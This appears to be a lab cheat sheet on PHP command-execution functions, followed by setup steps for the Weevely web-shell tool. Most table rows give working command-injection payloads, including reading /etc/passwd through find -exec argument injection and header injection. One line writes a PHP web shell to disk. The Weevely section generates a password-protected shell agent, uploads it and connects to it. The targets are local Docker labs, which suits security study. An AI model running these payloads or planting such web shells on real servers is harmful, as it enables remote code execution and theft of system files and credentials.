| Function / Technique                                      | What It Does                                           | Main Dangers                                | Working Attack Example                                                                             | Non-Working Attack Example                                                   |
|-----------------------------------------------------------|---------------------------------------------------------|----------------------------------------------|----------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------|
| `system($_GET['cmd'])`                                    | Executes command provided via URL                      | Remote Code Execution (RCE)                  | `http://localhost:8000/?cmd=ls`                                                                   | None if the command is valid                                                |
| `system(escapeshellcmd($_GET['cmd']))`                    | Executes commands avoiding concatenation               | Partial protection, vulnerable to arg injection | `?cmd=ls`                                                                                         | `?cmd=echo "<?php system($_GET['cmd']);" > webshell.php` (blocked)         |
| `system("ping -c 3 " . escapeshellcmd($_GET['host']))`    | Pings the specified host                               | Argument injection with spaces               | `?host=127.0.0.1`                                                                                  | `?host=127.0.0.1;cat /etc/passwd` (doesn’t work)                            |
| `system("find . -name ".escapeshellcmd($_GET['file']))`   | Searches for a specific file                           | Argument injection (e.g., `-exec`)           | `?file=index.php -exec cat /etc/passwd ;`                                                        | `?file=;cat /etc/passwd` (doesn’t work)                                     |
| `system("find . -name ".escapeshellarg($_GET['file']))`   | Searches file with protected arguments                 | Correct protection from argument injection   | `?file=index.php`                                                                                 | `?file=index.php -exec cat /etc/passwd` (blocked)                          |
| `passthru($_GET['cmd'])`                                  | Like `system()`, also shows binary output              | Arbitrary command execution                  | `?cmd=ls`                                                                                          | `?cmd=;cat /etc/passwd` if filtered                                         |
| `shell_exec($_GET['cmd'])`                                | Returns command output as string                       | RCE, easy command chaining                   | `?cmd=whoami`                                                                                      | `?cmd=invalidcommand` (silent error)                                        |
| `exec($_GET['cmd'])`                                      | Executes command, returns only last line               | Incomplete output                            | `?cmd=ls`                                                                                          | `?cmd=cat /nonexistentfile`                                                |
| `exec("ls -la", $array); print_r($array);`                | Saves full output in array                             | Output can be manipulated or filtered        | Direct PHP code                                                                                   | N/A (always works if `ls` is valid)                                         |
| `preg_replace('/.*/e', 'system("whoami");', '')`          | Uses regex to execute code                             | Deprecated, can hide code execution          | On older PHP versions                                                                            | In PHP ≥ 7.0: doesn’t work                                                 |
| `$output = $(whoami);`                                    | Alternate syntax for command execution                 | Helps obfuscation                            | `echo "<pre>$output</pre>";`                                                                      | Not supported in modern PHP                                                |
| `system(escapeshellcmd($_SERVER['HTTP_ACCEPT_LANGUAGE']))`| Executes a system command from the Accept-Language HTTP header | Can lead to command injection if header is manipulated | `curl -H "Accept-Language: ls" http://localhost:8000/` | `curl -H "Accept-Language: ;cat /etc/passwd" http://localhost:8000/` (blocked) |


## Weevely: easy creation of webshells

**weevely setup**

1. run server:  `docker run -d -p 8111:80 -v $PWD:/var/www/html php:7.0-apache `
2. run Weevely  `docker run -it janes/weevely bash `
   1. `weevely generate mypassword agent.php`
3. copy the generated `agent.php` to the web server


**weevely connection**

1. start a session inside Weevely container: `weevely http://<container-ip>/agent.php mypassword`
    1. to now container ip: `docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container-id>`
2. interact with the web shell
